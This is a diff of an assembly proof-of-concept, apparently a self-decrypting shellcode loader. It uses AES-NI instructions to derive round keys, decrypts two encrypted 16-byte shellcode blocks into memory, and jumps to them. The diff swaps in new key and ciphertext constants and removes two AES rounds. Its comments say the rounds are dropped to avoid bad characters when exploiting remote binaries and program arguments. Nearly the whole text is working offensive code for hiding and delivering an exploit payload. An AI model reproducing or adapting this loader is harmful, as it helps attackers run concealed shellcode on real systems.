@@ -1,5 +1,5 @@
-#$ as shellcode.s -o shellcode.o
-#$ ld shellcode.o -o shellcode
+#$ as shellcodePoC.s -o shellcodePoC.o
+#$ ld shellcodePoC.o -o shellcodePoC
 .data
 	.comm shellcode 32
 # an unaligned buffer for the decrypted shellcode since, it's impossible (at least, I don't know how) to store an arbitrary length in the registers using XMM, stack won't work either, as well as rewriting assembly it-self
@@ -9,7 +9,7 @@
 _start:
 
 # let's store the key
-movabs $0x1b614b73da6ac94a, %r14
+movabs $0x1b614b73da6ac94c, %r14
 # the first half of the key is reversed and goes to the R14, because Intel is little-endian and you can't store values directly to the XMM
 movq %r14, %xmm0
 # store it in the half of XMM0 (64 to 128 bits), it's pretty hackerish and undocumented since, XMM doesn't suppose to be modified directly, but with pointers
@@ -47,14 +47,7 @@ shufps $0b10001100, %xmm0, %xmm2
 pxor   %xmm2, %xmm0
 pxor   %xmm1, %xmm0
 aesimc %xmm0, %xmm7
-aeskeygenassist $4, %xmm0, %xmm1
-pshufd $0xff, %xmm1, %xmm1
-shufps $0b00010000, %xmm0, %xmm2
-pxor   %xmm2, %xmm0
-shufps $0b10001100, %xmm0, %xmm2
-pxor   %xmm2, %xmm0
-pxor   %xmm1, %xmm0
-aesimc %xmm0, %xmm8
+# the 3rd round is omited because, it contains potentially bad character - 0x04 which is EOT and it can cause problems when exploiting remote binaries
 aeskeygenassist $8, %xmm0, %xmm1
 pshufd $0xff, %xmm1, %xmm1
 shufps $0b00010000, %xmm0, %xmm2
@@ -71,14 +64,7 @@ shufps $0b10001100, %xmm0, %xmm2
 pxor   %xmm2, %xmm0
 pxor   %xmm1, %xmm0
 aesimc %xmm0, %xmm10
-aeskeygenassist $32, %xmm0, %xmm1
-pshufd $0xff, %xmm1, %xmm1
-shufps $0b00010000, %xmm0, %xmm2
-pxor   %xmm2, %xmm0
-shufps $0b10001100, %xmm0, %xmm2
-pxor   %xmm2, %xmm0
-pxor   %xmm1, %xmm0
-aesimc %xmm0, %xmm11
+# the 6th round is omited because, it contains potentially bad character - 0x20 which is space and it can cause problems when exploiting arguments in binaries
 aeskeygenassist $64, %xmm0, %xmm1
 pshufd $0xff, %xmm1, %xmm1
 shufps $0b00010000, %xmm0, %xmm2
@@ -116,10 +102,10 @@ movaps %xmm0, %xmm15
 
 # ok, now we can decrypt in ECB mode
 # same routine as for th key goes for the code
-movabs $0xb12ce73ee6d2f63b, %r14
+movabs $0x1cd68f30c7218244, %r14
 # first half of the code
 movq %r14, %xmm0
-movabs $0xf6e4be6324a92bc8, %r15
+movabs $0x2bf71a4f188cd8a0, %r15
 # second half of the code (each half-reversed)
 movq %r15, %xmm3
 shufps $0x1b, %xmm0, %xmm0
@@ -130,10 +116,10 @@ pxor       %xmm15, %xmm0
 aesdec     %xmm14, %xmm0
 aesdec     %xmm13, %xmm0
 aesdec     %xmm12, %xmm0
-aesdec     %xmm11, %xmm0
+# note that once again we omit the 6th rounded xmm11
 aesdec     %xmm10, %xmm0
 aesdec     %xmm9,  %xmm0
-aesdec     %xmm8,  %xmm0
+# and again we omit the 3rd rounded xmm8
 aesdec     %xmm7,  %xmm0
 aesdec     %xmm6,  %xmm0
 aesdeclast %xmm5,  %xmm0
@@ -150,9 +136,9 @@ movaps %xmm0, (%rsi)
 # GCC's address could be 0x600900 or 0x6001280 and it could be obtained directly from RDX, so for the morpher we will save the pointer from RDX to RSI, without any additional mathematical operation, thereby the shellcode will rewrite it-self
     
 # second block decryption juste like the first-one
-movabs $0xbe28868e0cb06609, %r14
+movabs $0xeeea86607bdeaf09, %r14
 movq %r14, %xmm0
-movabs $0x0c4943bf832b05aa, %r15
+movabs $0x7aa40344dd08133b, %r15
 movq %r15, %xmm3
 shufps $0x1b, %xmm0, %xmm0
 shufps $0x1b, %xmm3, %xmm0
@@ -161,10 +147,8 @@ pxor       %xmm15, %xmm0
 aesdec     %xmm14, %xmm0
 aesdec     %xmm13, %xmm0
 aesdec     %xmm12, %xmm0
-aesdec     %xmm11, %xmm0
 aesdec     %xmm10, %xmm0
 aesdec     %xmm9,  %xmm0
-aesdec     %xmm8,  %xmm0
 aesdec     %xmm7,  %xmm0
 aesdec     %xmm6,  %xmm0
 aesdeclast %xmm5,  %xmm0
@@ -174,4 +158,3 @@ add $16, %rdx
 movaps %xmm0, (%rdx)
 # "Release The Kraken!" I mean, shellcode
 jmpq *%rsi
-
